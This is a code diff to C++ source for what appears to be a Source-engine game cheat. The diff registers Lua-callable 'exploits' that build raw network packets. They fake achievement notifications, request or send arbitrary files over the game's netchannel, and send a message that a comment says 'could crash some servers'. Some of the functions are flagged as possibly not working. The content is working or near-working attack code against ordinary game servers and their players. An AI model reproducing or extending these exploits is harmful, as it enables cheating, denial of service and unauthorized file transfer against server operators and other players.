@@ -185,11 +185,10 @@ namespace lua_api {
 		netchannel->SendData(&write, true);
 		netchannel->Transmit(false);
 
-		LUA->PushBool(true);
-
-		return 1;
+		return 0;
 	}
 
+	// doesn't work? requires research
 	LUA_FUNCTION(exploit_sourcenet)
 	{
 		int data[23] = { 0, 83, 101, 110, 100, 83, 101, 114, 118, 101, 114, 77, 97, 112, 67, 121, 99, 108, 101, 0, 8, 8, 0 };
@@ -201,7 +200,7 @@ namespace lua_api {
 		write.WriteUInt(static_cast<uint32_t>(NetMessage::clc_CmdKeyValues), NET_MESSAGE_BITS);
 		write.WriteLong(22);
 
-		for (int i = 0; i < 23; i++)
+		for (int i = 0; i < sizeof(data) / sizeof(int); i++)
 		{
 			write.WriteChar(data[i]);
 		}
@@ -209,9 +208,61 @@ namespace lua_api {
 		netchannel->SendData(&write, true);
 		netchannel->Transmit(false);
 
-		LUA->PushBool(true);
+		return 0;
+	}
+	
+	// doesn't work? requires research
+	LUA_FUNCTION(exploit_achievement)
+	{
+		LUA->CheckNumber(1);
+		LUA->CheckNumber(2);
 
-		return 1;
+		int data[22] = { 0, 65, 99, 104, 105, 101, 118, 101, 109, 101, 110, 116, 69, 97, 114, 110, 101, 100, 0, 8, 8, 0 };
+		static uint8_t packet[256 + 2 + sizeof(data)];
+
+		CNetChan* netchannel = EngineClient->GetNetChannelInfo();
+		bf_write write;
+		write.StartWriting(packet, sizeof(packet));
+		write.WriteUInt(static_cast<uint32_t>(NetMessage::clc_CmdKeyValues), NET_MESSAGE_BITS);
+		write.WriteLong(LUA->GetNumber(1));
+		write.WriteSignedInt(LUA->GetNumber(2), 16);
+
+		for (int i = 0; i < sizeof(data) / sizeof(int); i++)
+		{
+			write.WriteChar(data[i]);
+		}
+
+		netchannel->SendData(&write, true);
+
+		return 0;
+	}
+
+	LUA_FUNCTION(exploit_requestfile)
+	{
+		LUA->CheckString(1);
+
+		CNetChan* netchannel = EngineClient->GetNetChannelInfo();
+		const char* fileName = LUA->GetString(1);
+
+		// https://github.com/perilouswithadollarsign/cstrike15_src/blob/f82112a2388b841d72cb62ca48ab1846dfcc11c8/engine/net_chan.cpp#L572
+		netchannel->RequestFile(&fileName, false);
+
+		return 0;
+	}
+
+	LUA_FUNCTION(exploit_sendfile)
+	{
+		LUA->CheckString(1);
+		LUA->CheckNumber(2);
+
+		CNetChan* netchannel = EngineClient->GetNetChannelInfo();
+		const char* fileName = LUA->GetString(1);
+		unsigned int transferID = LUA->GetNumber(2);
+
+		// https://github.com/perilouswithadollarsign/cstrike15_src/blob/f82112a2388b841d72cb62ca48ab1846dfcc11c8/engine/net_chan.cpp#L611
+		netchannel->SendFile(fileName, transferID);
+
+		return 0;
 	}
 
 	// FIXME: i don't know why it doesn't work
@@ -225,8 +276,6 @@ namespace lua_api {
 		std::string pathName("C:\\asuna\\lua\\");
 		std::string fileName(LUA->GetString(1));
 		std::string rootPath = pathName + fileName;
-		
-		logger::AddLog("[debug] %s", rootPath.c_str());
 
 		if (!fs::exists(rootPath.c_str()))
 		{
@@ -243,7 +292,14 @@ namespace lua_api {
 			return 0;
 		}
 
-		RunScript(content);
+		try
+		{
+			std::thread(RunScript, content).detach();
+		}
+		catch (std::exception& e)
+		{
+			logger::AddLog("[error] %s", e.what());
+		}
 
 		return 0;
 	}
@@ -276,6 +332,9 @@ namespace lua_api {
 			// returns true if player currently in game
 			Lua->PushCFunction(is_in_game);
 			Lua->SetField(-2, "is_in_game");
+
+			Lua->PushCFunction(load_script);
+			Lua->SetField(-2, "load_script");
 
 			if (EngineClient->IsInGame())
 			{
@@ -350,6 +409,16 @@ namespace lua_api {
 					// previously it could crash some servers
 					Lua->PushCFunction(exploit_sourcenet);
 					Lua->SetField(-2, "sourcenet");
+
+					// notifies about fake achievement earning
+					Lua->PushCFunction(exploit_achievement);
+					Lua->SetField(-2, "achievement");
+
+					Lua->PushCFunction(exploit_requestfile);
+					Lua->SetField(-2, "requestfile");
+
+					Lua->PushCFunction(exploit_sendfile);
+					Lua->SetField(-2, "sendfile");
 				}
 				Lua->SetField(-2, "exploits");
 
